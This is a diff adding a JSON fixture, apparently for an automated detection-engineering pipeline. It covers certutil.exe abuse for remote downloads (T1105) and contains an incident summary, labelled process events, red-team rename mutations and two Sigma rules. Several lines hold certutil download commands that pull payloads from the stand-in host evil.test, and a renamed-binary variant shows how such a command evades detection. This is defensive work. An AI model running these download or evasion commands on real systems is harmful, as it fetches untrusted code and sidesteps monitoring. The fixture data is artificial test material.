@@ -1,0 +1,75 @@
+{
+  "name": "certutil-t1105",
+  "raw_threat": "Incident writeup: During a recent intrusion, the actor used the signed Windows binary certutil.exe to pull a second-stage executable from an attacker-controlled server. Command lines included 'certutil.exe -urlcache -split -f http://evil.test/payload.exe C:\\Temp\\payload.exe' and a variant using '-verifyctl'. This is classic living-off-the-land download activity (LOLBin) mapped to MITRE ATT&CK T1105 (Ingress Tool Transfer). Defenders should detect certutil download flags in process-creation telemetry, while avoiding false positives from legitimate certutil hashing and certificate-store operations.",
+  "source_type": "writeup",
+  "source_ref": "IR-2026-CERTUTIL-LOLBIN",
+  "responses_json": {
+    "ingest": {
+      "title": "Certutil.exe abused for remote payload download (LOLBin, T1105)",
+      "summary": "Threat actors invoke the signed Windows binary certutil.exe with the -urlcache or -verifyctl flags to download attacker-controlled payloads over HTTP, living off the land to bypass application allowlisting. Observed retrieving second-stage executables to disk prior to execution.",
+      "platforms": ["windows"],
+      "attack_techniques": ["T1105"],
+      "iocs": ["http://evil.test/payload.exe"],
+      "references": [
+        "https://attack.mitre.org/techniques/T1105/",
+        "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+      ]
+    },
+    "extract": [
+      {
+        "id": "b1",
+        "description": "certutil.exe launched with -urlcache/-verifyctl download flags pointing at a remote URL",
+        "attack_technique": "T1105",
+        "log_source": {"category": "process_creation", "product": "windows"},
+        "telemetry_fields": ["Image", "OriginalFileName", "CommandLine", "ParentImage"],
+        "rationale": "Download switches on a certificate utility are near-exclusively malicious LOLBin usage",
+        "evidence": "inferred"
+      }
+    ],
+    "corpus": {
+      "positives": [
+        {"Image": "C:\\Windows\\System32\\certutil.exe", "OriginalFileName": "CertUtil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://evil.test/payload.exe C:\\Temp\\payload.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe"},
+        {"Image": "C:\\Windows\\System32\\certutil.exe", "OriginalFileName": "CertUtil.exe", "CommandLine": "certutil -verifyctl -f -split http://evil.test/b.dll b.dll", "ParentImage": "C:\\Windows\\System32\\cmd.exe"}
+      ],
+      "negatives": [
+        {"Image": "C:\\Windows\\System32\\certutil.exe", "OriginalFileName": "CertUtil.exe", "CommandLine": "certutil -hashfile C:\\app\\installer.exe SHA256"},
+        {"Image": "C:\\Windows\\System32\\certutil.exe", "OriginalFileName": "CertUtil.exe", "CommandLine": "certutil -store my"},
+        {"Image": "C:\\Windows\\System32\\certutil.exe", "OriginalFileName": "CertUtil.exe", "CommandLine": "certutil -decode encoded.b64 decoded.bin"},
+        {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell -c Invoke-WebRequest http://cdn.contoso.com/app -OutFile app.msi"}
+      ],
+      "notes": "Negatives cover legitimate certutil hashing/store/decode plus a different-tool download."
+    },
+    "red_team_r1": [
+      {
+        "id": "rt-rename-biz",
+        "mutation_class": "renamed-lolbin",
+        "severity": "high",
+        "description": "certutil.exe copied to a business-looking name (AdobeUpdater.exe) and run with -urlcache — same download behavior, defeats an Image-path anchor",
+        "event": {
+          "Image": "C:\\Users\\Public\\AdobeUpdater.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "AdobeUpdater.exe -urlcache -split -f http://evil.test/p.exe C:\\Temp\\p.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ],
+    "red_team_r2": [
+      {
+        "id": "rt-rename-biz-again",
+        "mutation_class": "renamed-lolbin",
+        "severity": "high",
+        "description": "Same business-name rename (AdobeUpdater.exe) attempted against the re-authored v2 rule",
+        "event": {
+          "Image": "C:\\Users\\Public\\AdobeUpdater.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "CommandLine": "AdobeUpdater.exe -urlcache -split -f http://evil.test/p.exe C:\\Temp\\p.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "responses_text": {
+    "author": "```yaml\ntitle: Certutil LOLBin Remote Download (T1105)\nid: certutil-urlcache-download\nstatus: experimental\ndescription: Detects certutil.exe used with download flags to retrieve remote payloads.\nreferences:\n  - https://attack.mitre.org/techniques/T1105/\nlogsource:\n  category: process_creation\n  product: windows\nlevel: high\ndetection:\n  selection_img:\n    Image|endswith: '\\certutil.exe'\n  selection_flags:\n    CommandLine|contains:\n      - '-urlcache'\n      - '-verifyctl'\n  condition: selection_img and selection_flags\nfalsepositives:\n  - Rare administrative CRL retrieval\ntags:\n  - attack.command_and_control\n  - attack.t1105\n```",
+    "author_r2": "```yaml\ntitle: Certutil LOLBin Remote Download (T1105) rename-resistant\nid: certutil-download-origfilename\nstatus: experimental\ndescription: Detects certutil download flags anchored on OriginalFileName so an on-disk rename cannot evade it.\nreferences:\n  - https://attack.mitre.org/techniques/T1105/\nlogsource:\n  category: process_creation\n  product: windows\nlevel: high\ndetection:\n  selection_tool:\n    OriginalFileName: 'CertUtil.exe'\n  selection_flags:\n    CommandLine|contains:\n      - '-urlcache'\n      - '-verifyctl'\n  condition: selection_tool and selection_flags\nfalsepositives:\n  - Rare administrative CRL retrieval\ntags:\n  - attack.command_and_control\n  - attack.t1105\n```"
+  }
+}
